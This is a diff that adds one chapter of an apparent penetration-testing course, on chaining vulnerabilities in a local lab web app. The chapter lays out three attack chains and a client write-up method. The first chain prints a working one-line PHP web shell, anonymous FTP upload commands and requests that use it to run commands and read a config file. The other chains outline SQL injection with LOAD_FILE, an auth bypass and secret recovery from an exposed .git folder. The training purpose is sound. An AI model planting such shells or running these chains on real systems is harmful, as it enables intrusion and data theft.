@@ -1,0 +1,61 @@
+<?xml version='1.0' encoding='utf-8'?>
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta charset="utf-8"/>
+<title>Session 6: Chaining It Together</title>
+<link rel="stylesheet" type="text/css" href="../styles.css"/>
+</head>
+<body>
+<h1>Session 6: Chaining It Together</h1>
+<p>Goal for this session: nothing new to learn. Every step below was covered in an earlier session. The point is to run three chains end to end, in one sitting, and then write the whole thing up as if a client were paying for it. A finding on its own is a line in a report. A chain is the reason the client keeps you on the phone.</p>
+<h2>6.1 Chain One: FTP Anonymous Upload to Remote Code Execution</h2>
+<table>
+<thead><tr><th>Step</th><th>Finding</th><th>Session</th></tr></thead>
+<tbody>
+<tr><td>Upload a PHP shell anonymously over FTP</td><td>anonymous write (15)</td><td>5.2</td></tr>
+<tr><td>The upload directory is served by Apache and executes PHP</td><td>unrestricted upload / shared dir (12, 19)</td><td>4.4, 5.6</td></tr>
+<tr><td>Request the shell in a browser, run commands as <code>www-data</code></td><td>&#8212;</td><td>&#8212;</td></tr>
+</tbody>
+</table>
+<pre>printf '&lt;?php echo shell_exec($_GET["c"]);' &gt; s.php
+curl -s --ftp-pasv -T s.php ftp://127.0.0.1/upload/s.php
+curl -s 'http://127.0.0.1:8080/uploads/ftp/s.php?c=id'
+curl -s 'http://127.0.0.1:8080/uploads/ftp/s.php?c=cat+/var/www/html/admin/config.php'</pre>
+<p>Two services, each with a finding a scanner would rate "medium," combine into code execution on the web host. Neither ZAP nor an FTP scan, run alone, would have connected them.</p>
+<h2>6.2 Chain Two: Exposed <code>.git</code> to Admin Access</h2>
+<table>
+<thead><tr><th>Step</th><th>Finding</th><th>Session</th></tr></thead>
+<tbody>
+<tr><td>Find and dump <code>/admin/.git/</code></td><td>exposed repository (9)</td><td>4.1</td></tr>
+<tr><td>Recover the API key from the first commit</td><td>secret in history (9)</td><td>4.1</td></tr>
+<tr><td>Or: dump <code>users</code> via search, crack the admin MD5</td><td>search injection (1)</td><td>2.1</td></tr>
+<tr><td>Or: bypass login outright, land on the admin session</td><td>auth bypass (2)</td><td>2.2</td></tr>
+<tr><td>With an admin session live, predict its token from a fresh client</td><td>predictable session (13)</td><td>4.5</td></tr>
+</tbody>
+</table>
+<p>There are three separate routes to administrator here, and a good write-up names all three, because the client will fix one and think they are done. Once you are admin, Session 2.3's second-order payload is available, and that hands you every password hash in the store.</p>
+<h2>6.3 Chain Three: Customer to File Read on the Database Host</h2>
+<table>
+<thead><tr><th>Step</th><th>Finding</th><th>Session</th></tr></thead>
+<tbody>
+<tr><td>Register or log in as an ordinary customer</td><td>&#8212;</td><td>1.1</td></tr>
+<tr><td>Call the price API for a product you do not own</td><td>broken authorisation / IDOR (4)</td><td>2.4</td></tr>
+<tr><td>Inject on <code>id</code>, error-based, wrap <code>LOAD_FILE</code></td><td>SQL injection (4)</td><td>2.4</td></tr>
+<tr><td>Read <code>/etc/passwd</code> or the flag file off the DB container</td><td>&#8212;</td><td>&#8212;</td></tr>
+</tbody>
+</table>
+<p>A logged-in customer, the lowest privilege the app hands out, reaches arbitrary file read on a different container. The authorisation bug and the injection bug are both required; either one alone is far less serious.</p>
+<h2>6.4 The Write-Up</h2>
+<p>Now produce the deliverable. For each chain:</p>
+<ul>
+<li><strong>Narrative.</strong> What an attacker does, in order, in plain sentences. No tool output yet.</li>
+<li><strong>Evidence.</strong> The exact requests and responses, trimmed to what proves the point.</li>
+<li><strong>Impact.</strong> What the attacker can now do that they could not before. Be specific: "read any customer's order," "execute commands as the web user," not "high severity."</li>
+<li><strong>Remediation.</strong> The fix for each link, and which single fix breaks the whole chain if you can only ship one this quarter.</li>
+</ul>
+<p>Cross-check your findings against <code>docs/scenarios.md</code>, the instructor edition. If you found all nineteen and can defend the fix for each, you have completed the course. If ZAP found eight and you found the other eleven with your own head, you have understood it.</p>
+<h2>6.5 Closing the Loop</h2>
+<p>The tools in this course each do one job well. ZAP sweeps. sqlmap drills. testssl.sh reads a handshake. gobuster guesses paths. Wireshark shows you the wire. None of them chains findings, weighs impact, or writes the sentence that makes a client act. That part was never going to be the tool's job, and it isn't. What stays constant across every engagement is the tester's job: sweep with the tool, go where the tool stops, connect the small things into the big thing, and hand back a report someone can act on. That is the whole course in one sentence. Let the scanner sweep, then think.</p>
+</body>
+</html>
